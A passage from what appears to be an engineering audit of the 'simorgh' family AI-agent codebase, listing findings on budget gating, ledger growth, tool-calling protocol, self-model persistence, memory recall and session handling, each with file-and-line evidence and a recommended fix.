simorgh/cognition/budget.py:85-92 -- `estimate_cost` docstring: providers with no configured price 'estimate to 0.0, so this never blocks them'; router.py:131-134 uses that estimate for the per-request `max_cost_usd` gate (chat's cap is $0.05, config.py:22 -- every CLI chat call exceeds it and is never refused)

simorgh/cognition/router.py:139-140 -- a candidate skipped because `can_spend` is false is skipped with no log or ledger event; the only human-visible signal is the provider-changed UI notice (service.py:508-537), which fires once per switch

simorgh/cognition/providers/claude_code.py:83-92,101 -- every call spawns a fresh `claude -p ... --disallowedTools "*"` process in a temp dir; `tools` and `max_tokens` are ignored; `input_tokens=0, output_tokens=0` reported (line 149), so the CLI's budget can only count calls
findings.why_it_matters: The design intent ('Together is Sim's LLM now') is right for one family on one laptop; the failover undermines it. A day cap on the cheap provider silently promotes a 5x slower, 150x dearer, subscription-quota-burning backend that the budget subsystem cannot see, and 'review' -- the most frequent autonomous purpose -- goes there too. The 2026-09-11 incident in config.py:78-84 is the symptom; the structural cause is a provider with no price in a system whose only guard is price.
findings.recommendation: Give `claude_code_cli` `only_purposes = ["draft"]` (or drop it from `provider_order` by default) and put a same-cost-class provider second (a second Together model via `backend = "together"`, or Gemini flash with a key). Give the CLI a nominal `price_in/price_out` and a `max_spend_usd` so both gates apply, and log `cognition.provider_skipped_budget` at router.py:139 so a budget-driven failover is on the ledger like a failure-driven one.

findings.title: Curiosity appends a ledger event every 3 seconds while doing nothing: 161k events, 45 MB of 'autonomy_paused'
findings.claim: `_record_tick` is called on every skipped idle tick, the idle tick fires every 3 s, and `curiosity:` streams have no retention, so a paused Curiosity has written the largest single stream in the cognitive core (45,068,994 bytes) recording that it did nothing.
evidence: `ls -la streams/curiosity%3Aticks.jsonl` -> `45068994` bytes; `wc -l` -> 161,096 events (vs `cognition:calls` 2.4 MB, `memory:episodic` 1.8 MB)

ledger measurement: `curiosity ticks total 161096 last-20000 reasons: {'autonomy_paused': 20000}`; `mean interval last 2000 ticks: 3.02 s`; last record: `{"backlog":0,"picked":[],"proposed":[],"skipped_reason":"autonomy_paused",...}`

simorgh/curiosity/service.py:396-403 -- `_run_tick_locked` calls `await self._record_tick(skipped_reason="autonomy_paused")` (and the same for paused/backlog/cooldown/budget) on every idle tick; simorgh/kernel/api.py:40 `idle_tick_cooldown_s: float = 3.0`
simorgh/ledger/compaction.py:36 `DEFAULT_RETENTION = {"trace:": "2d", "dead:": "30d", "activity": "90d"}` -- no entry for `curiosity:`, so 'no match means forever' (compaction.py:66)
findings.why_it_matters: This is the same 'ledger growth' shape that produced the 192k-trace-file cleanup, coming from a subsystem that is switched off. It also makes the audit record useless: 99.99% of `curiosity:ticks` carries no information.
findings.recommendation: Record a skipped tick only when `skipped_reason` changes from the previous tick (edge-triggered), and add `"curiosity:ticks": "2d"` to DEFAULT_RETENTION. Ten lines.

findings.title: No native tool calling: tools are a first-line text marker with one positional argument, and the model is never told what a tool does
findings.claim: Cognition always passes `tools=None`, the Together/Ollama providers never send a `tools` array, and the model is told only tool NAMES plus a few hand-written argument hints -- so it invents argument shapes, emits its own native `<tool_call>` syntax that has to be unwrapped, and can make at most one call per reply outside a whitelisted parallel set.
evidence: simorgh/cognition/service.py:357-358 `response, floor = await self._router.complete(purpose, think_messages, tools=None, ...)`; providers/together.py:120-131 builds `body` with only model/messages/max_tokens/reasoning_effort (no `tools`)

simorgh/cognition/service.py:67-93 `_tool_instruction_block`: 'Tools available this turn: NAMES ... write its name in capitals, a colon, then your argument, as the very first line' -- names only; per-tool `tool_hints` are 'a short, hand-maintained, per-tool addendum' (lines 63-66)

simorgh/cognition/parser.py:151-166 `_unwrap_native_tool_tags`: 'GLM-5.3-Flash replied ... <tool_call>SEARCH_CODE: word_count</arg_value>' -- the model uses the tool syntax it was trained on and the parser has to strip it

simorgh/orchestration/tools.py:669-690 `to_action_payload` splits the single `argument` by first line / fenced code / JSON rest per tool; simorgh/orchestration/api.py:111-121 -- `marker_corrected`, `claim_corrected`, `invented_corrected` flags exist to send malformed markers back once each
findings.why_it_matters: A large share of the harness's live-caught bugs (markers mid-sentence, invented tools, wrong JSON shape for propose_mcp_server, fenced code in sandbox args) are symptoms of re-implementing function calling in prose for a model that already speaks the OpenAI tools schema. The Guardian invariant does not depend on the marker protocol -- every call still flows through `action.proposed` -- so the safety argument for keeping it does not hold.
findings.recommendation: Pass the Execution registry's JSON schemas as `tools` on the OpenAI-compatible endpoints (Together and Ollama both accept them) and read `message.tool_calls` back into the same `tool_calls` reply field; keep the marker parser only as the fallback for the CLI provider, which cannot take tools. Do it for the CHAT profile first (34 tools, the primary UX).

findings.title: The Self Model is volatile: a restart forgets competence, limitations and change history, so the prompt's self-knowledge is whatever happened since boot
findings.claim: The Self Model is mutated in memory only and never folded from a ledger stream, so the one real self-finding Reflection produced (research overconfident: stated 0.78 vs empirical 0.53) and 44 applied patches are absent from the live model, whose rendered state after one restart is 'bad at: none, changed: none, competence: unknown 97%'.
evidence: simorgh/worldmodel/selfmodel.py:16-23: 'mutations here are in-memory only for this session, not yet a fold of a durable `self:model` Ledger stream across restarts'
~/.simorgh/worldmodel/self/SELF.md (live): `## What I know I'm bad at\n(none recorded yet)` / `## What I've changed about myself (last 10)\n(none recorded yet)` / `Restarts recorded: 1`

ledger: `reflect:calibration` 1 snapshot `{"brier": 0.218, "empirical_accuracy": 0.526, "samples": 19, "stated_confidence": 0.78, "task_type": "research"}`; `learn:outcomes` has 44 `('patch', True)`; neither appears in the live model

simorgh/learning/service.py:74 rebuilds the CompetenceTable from `learn:outcomes` at start but only publishes `learn.competence.updated` on new outcomes (outcomes.py:127-131), so World Model learns a task type only when one finishes after boot; reflection's CalibrationTable is likewise in-process (reflection/service.py:149)
findings.why_it_matters: The blueprint's idea -- the Self Model is exactly the fold of a stream -- is the right one and the rest of the system (Learning's CompetenceTable via `ledger.rebuild`) already does it. Leaving the one subsystem whose job is continuity as the one without it means 'what I know about myself' is reset by the loader's own rollbacks and by every `sim.sh` restart.
findings.recommendation: At worldmodel start, fold `learn:outcomes`, `reflect:calibration` and `reflect:self` through the existing pure mutators (they are already `(SelfModel, fields) -> SelfModel`), or have Learning and Reflection re-publish their current tables on `system.started`. Either is a day's work and turns SELF.md into a real record.

findings.title: Reflection's critiques undo Memory's own 'no task text in episodic memory' rule and land in family chat prompts
findings.claim: Memory refuses to store non-chat turns as episodic memory, but Reflection writes every patch/skill/research/project critique into the same episodic kind with no person tag, so they pass the voice-channel ownership filter and compete for the six 'most recent' slots that are a chat's only conversational context.
evidence: simorgh/memory/service.py:217-222 -- `if str(payload.get("kind") or "chat") != "chat": return` ('A task's own model session ends with turn.completed too; its description is not something a person said')
simorgh/reflection/service.py:346-349 -- `MEMORY_STORE {"kind": "episodic", "content": critique.what_changed, "tags": ["self_critique", f"task:{task_id}"]}`
simorgh/orchestration/context.py:251-254 (recent recall: `query=""`, `kinds=["episodic"]`, k=6, pure recency) and :288-294 (`_theirs` admits any item with no `person:` tag)

ledger measurement: `self_critique episodic: 125`; `125 critiques; 122 within 10 min of a human chat turn`; sample content: `'Honest final status: **no source change was applied, and the task is not complete.**\n\nWhat I did this session: ...'`
findings.why_it_matters: This is the 'one side fixed, the other side undone' shape in miniature: a self-critique about a failed code patch is exactly the text that should never be recalled into a child's spoken turn as 'what we were just saying'. It also skews the recency window that was added specifically to keep corrections ('March 6th, not 4th') in view.
findings.recommendation: Store critiques as `procedural` (or a new `reflective` kind) tagged `origin:reflection`, and have the chat recall in context.py request `kinds=["episodic"]` with `filters={"tags": ...}` that excludes them; five lines in each place.

findings.title: Chat and voice sessions are per-turn task ids; the designed session window (WorkingMemory) has no producer, so 'the conversation' is a global 6-record recency recall
findings.claim: There is no session object that spans turns in any channel: the CLI mints a uuid per line, voice per spoken turn, the orchestration `Session` is a task-attempt record whose `restore_session` reads an empty stream for a fresh id, and Memory's `WorkingMemory` (bounded per-session turns, with config fields) has never had a producer -- so the substitute for dialogue history is the 6 most recent episodic records across all speakers and channels (extends the already-known 'no sliding buffer' finding with where the designed slot is).
evidence: simorgh/interface/service.py:943 `session_id = str(uuid.uuid4())` per typed line; simorgh/voice/session.py:888 and voice/pipeline.py:353 per spoken turn; simorgh/orchestration/worker.py:402-405 `Session(task_id=session_id, kind="chat", ...)`; orchestration/resume.py:112 `events = await ledger.read(f"task:{session.task_id}")`

simorgh/memory/store.py:51-75 WorkingMemory docstring: 'nothing in the codebase publishes `memory.store{kind:"working"}` outside tests'; my grep for `"working"` outside simorgh/memory/ finds only the wire enum (contracts/messages/memory.py:9); memory/config.py:15-21 `working_max_turns`/`working_max_chars` bound 'a window that never receives real data'

simorgh/orchestration/context.py:36-66 documents the measured consequence (machine names and a corrected birthday lost within one 22-turn session) and the `_MEMORY_RECENT_K = 6` workaround; context.py:292-294 shows the recency window is only speaker-filtered on the voice channel
simorgh/learning/outcomes.py:63-71 -- the HTTP path that DOES reuse an id ('send the same id every time') then collides with retry/attempt semantics in `_task_facts`
findings.why_it_matters: For one family talking to one agent, a dialogue is the primary unit of interaction, and today it is reconstructed from vocabulary-overlap recall plus a recency window shared with every autonomous task. The blueprint already reserved the right slot (working memory keyed by session); building the recency hack instead of wiring it means every channel re-solves continuity differently.
findings.recommendation: Give each channel a stable conversation id (the REPL's existing `self.session_id`; the voice `device`+speaker; the HTTP client id) separate from the per-turn task id, feed `turn.completed` into `WorkingMemory.add(conversation_id, ...)` in memory/service.py, and have context.py ask `kinds=["working"]` with `filters={"session_id": conversation_id}` before the episodic recalls. Keep the per-turn task id for leases and traces.

findings.title: Curiosity's budget throttle reads fields Cognition never sends
findings.claim: `_on_provider_status` reads `budget.remaining_fraction` and `budget.free`, but the provider-status payload carries `calls/max_calls/spend_usd/max_spend_usd/exhausted`, so `worst_remaining` stays None, `_exploration_rate()` is always 1.0, and `budget_backoff_below_remaining`/`budget_stop_below_remaining` are dead config.
evidence: simorgh/curiosity/service.py:231-238 -- `remaining = budget.get("remaining_fraction")`, `free = bool(budget.get("free", False))`

simorgh/cognition/service.py:456-460 publishes `"budget": {"window_seconds", "calls", "max_calls", "spend_usd", "max_spend_usd", "exhausted"}`; `grep -rn 'remaining_fraction' simorgh` finds only the Curiosity reader
simorgh/curiosity/service.py:480-488 `_exploration_rate` returns 1.0 when `remaining is None`
guardian/service.py `_on_provider_status` computes `_fraction_used(p.get("budget"))` from the real fields -- the derivation Curiosity should share
findings.why_it_matters: The 2026-09-07 'unattended night drained the daily budget' incident was answered with `min_explore_interval_seconds` (which works) while the budget-proportional backoff designed for it has silently never fired. It is a fresh instance of the project's dominant bug shape, in the subsystem that spends money on its own initiative.
findings.recommendation: Compute `remaining = 1 - max(calls/max_calls, spend/max_spend)` from the fields actually sent (or lift Guardian's `_fraction_used` into contracts) and delete the `free` flag, which nothing sets.

findings.title: The recall time budget, not the embedder, is the wrong constant: hashing is forced by a 0.25 s limit on a path whose STT alone takes seconds
findings.claim: Embeddings are a 256-bucket sha256 bag of words with no paraphrase ability (measured 0.000 for 'stop the loop' vs 'halting a runaway iteration'), chosen because `orchestration/context.py` gives the whole recall 0.25 s and a local sentence-transformer costs 47 ms warm; that budget is arbitrary next to 1.8-6.8 s of STT and 1.3-9.5 s of LLM per turn, and it is what keeps the memory that every prompt depends on at vocabulary-match quality.
evidence: simorgh/memory/embed.py:23-32 (hashing trick), simorgh/memory/config.py:64 `embedder: str = "hashing"`; ~/.simorgh/simorgh.toml has no `[memory]` section, so production runs hashing

simorgh/memory/embedders.py:6-16: '"how do I stop the loop" vs "halting a runaway iteration" -> 0.000'; memory/config.py:51-63: local MiniLM '24.9 SECONDS on the first call ... warm it is still 47 ms against 3 ms' and 'orchestration/context.py allows recall 0.25 s'
simorgh/orchestration/context.py:21 `DEFAULT_TIMEOUT_S = 0.25`; docs/module-map.md section 3: 'stt 1.8-6.8 s ... llm 1.3-9.5 s'
simorgh/memory/store.py:175-187 `warm()` already builds the index at boot, so the 24.9 s cold cost is boot-time, not first-turn time
findings.why_it_matters: Memory is the only cross-turn context (see the session finding), so recall quality bounds conversation quality. The current choice optimises a latency that is a rounding error on the voice path while accepting that a fact phrased differently last week is unfindable.
findings.recommendation: Raise the recall timeout to ~1 s, opt in `[memory] embedder = "local"` (warm at boot via `warm()`), and keep hashing as the fallback the code already has. Separately, consider embedding distilled facts ('Saeed's mini PC is called falcon') rather than raw turn transcripts, which is where paraphrase matters most.

findings.title: The floor provider is an in-band success that 41 sites must special-case, and the purposes/budget table is largely fiction
findings.claim: A 'provider' that always answers with canned text has produced 0 of 9,379 real replies but forced floor-handling into 18 files outside cognition and once cascaded a budget outage into a Guardian lockdown; meanwhile 9 purposes are configured, 4 account for 99.97% of calls, the primary provider overrides `max_tokens_out` to 4,000 while the pre-call cost estimate still uses the configured 512-1,000, and `Budget.require_real` from the purposes table is never read.

Making it a successful reply pushes the outage into data that Persona, Reflection, Guardian, Memory and Curiosity each had to learn to recognise -- the module boundaries you built are being paid for by every subsystem re-deriving 'was that real?'.
findings.recommendation: Delete FloorProvider and make every purpose `require_real`; collapse `DEFAULT_PURPOSE_BUDGETS` to chat/draft/review/consolidate and let the Together provider's 4,000-token floor be the configured number so the pre-call estimate matches what is sent.

findings.title: Cognition's 'no real provider' health timer is inverted
findings.claim: `_no_real_provider_since` is set to `now` on every floor reply, so `health()` reports degraded only when more than 300 s have passed since the LAST floor reply -- i.e. only once the system has stopped asking, never while it is actively falling to the floor.
evidence: simorgh/cognition/service.py:374 `self._no_real_provider_since = self._ctx.clock.now() if floor else None`
simorgh/cognition/service.py:242-247 `elapsed = now - self._no_real_provider_since; if elapsed > 300: return Health.degraded(...)`
findings.why_it_matters: Has not bitten (0 floor replies on the ledger) but it is the one health signal for the subsystem the whole system depends on, and it is wired backwards; if the floor is kept, this is what would tell the operator.
findings.recommendation: Set the timestamp only when it is None (`self._no_real_provider_since = self._no_real_provider_since or now` on floor, `None` on a real reply), or drop it with the floor.

findings.title: RollingWindowBudget replays its whole stream on every candidate check and the stream is never truncated
findings.claim: `status()` reads the full `cognition:budget:<provider>` stream on every `can_spend` (once per candidate per think), four times every 30 s, and on each provider change; the 24 h window is computed over a file kept forever, currently 6,991 events / 1.6 MB / 13 ms per replay and growing linearly.
evidence: simorgh/cognition/budget.py:55-60 `events = await self._ledger.read(stream_for(self._provider))` with no `from_seq`; callers router.py:139 (`can_spend`), service.py:448 (`[await b.status() for b in self._budgets.values()]` on the 30 s tick), service.py:492, :524

simorgh/ledger/compaction.py:36 DEFAULT_RETENTION has no `cognition:` entry (forever); the Ledger already offers projections with snapshots (`ledger.rebuild`, used at learning/service.py:74)
findings.why_it_matters: The durable-window design is right; replaying instead of folding is the part that will turn into 'Sim got slow' after a few months of voice use, at exactly the call site on every think.
findings.recommendation: Keep a per-provider deque of (ts, cost) folded once at start (from the last 24 h only, via `read(from_seq=...)` or a snapshot) and appended in `record()`, or simply add `"cognition:budget:": "2d"` to retention so the replay stays bounded.

findings.title: Learning's patch pipeline, Reflection's drift review and Curiosity's drives are scaffolding that costs money or health noise without producing decisions
